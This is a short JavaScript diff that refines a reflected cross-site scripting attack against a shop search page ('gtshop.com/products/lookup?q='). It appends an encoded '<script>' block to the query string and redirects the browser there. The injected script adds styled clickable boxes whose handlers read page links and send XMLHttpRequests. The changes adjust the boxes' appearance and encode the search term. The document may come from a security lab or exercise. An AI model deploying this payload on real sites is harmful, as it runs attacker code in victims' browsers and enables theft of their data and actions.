@@ -19,10 +19,12 @@
 				newDiv.style.width="20px";
 				newDiv.style.height="20px";
 				newDiv.style.border="solid";
-				newDiv.style.color="red";
+				newDiv.style.color="green";
 				newDiv.style.position = "relative";
 				newDiv.style.display = "inline-block";
 				newDiv.style.right="20px";
+				newDiv.style.opacity="0.6";
+				newDiv.style.background="green";
 				newDiv.onclick = function(event) {
 					var Http = new XMLHttpRequest();
 					var href = document.getElementById(index).parentNode.firstChild.href;
@@ -46,7 +48,7 @@
 	})
 
 	`
-	var url = "http://www.gtshop.com/products/lookup?q=" + searchQuery + '<script>' + encodeURIComponent(script) + '<\/script>'
+	var url = "http://www.gtshop.com/products/lookup?q=" + encodeURIComponent(searchQuery) + '<script>' + encodeURIComponent(script) + '<\/script>'
 	window.location.href = url
 	return false
 
